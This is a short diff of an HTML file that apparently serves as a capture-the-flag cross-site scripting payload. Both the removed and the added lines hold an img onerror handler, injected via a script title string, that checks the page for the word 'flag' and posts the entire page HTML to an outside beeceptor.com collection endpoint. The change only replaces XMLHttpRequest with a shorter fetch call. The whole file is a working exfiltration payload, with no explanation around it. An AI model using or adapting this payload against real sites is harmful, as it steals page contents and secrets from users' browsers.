@@ -1,18 +1,7 @@
 <html>
  <body>
    	<script>this.document.title = "a"; this.document.title = "
-	<img src="a" onerror="
-	function sendContent() {
-				var flag = "flag";
-				var content = document.documentElement.innerHTML;
-				if (content.indexOf(flag) !== -1) {
-					var xhttp = new XMLHttpRequest();
-					xhttp.open("POST", "https://alexyqiu.free.beeceptor.com", true);
-					xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-					xhttp.send("content=" + content);
-				}
-			}
-	">
+	<img src="a" onerror=" if (document.documentElement.innerHTML.indexOf("flag") !== -1) fetch("https://alexyqiu.free.beeceptor.com", {method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: "content=" + encodeURIComponent(document.documentElement.innerHTML)});">
 	"</script>
 </body>
 </html>
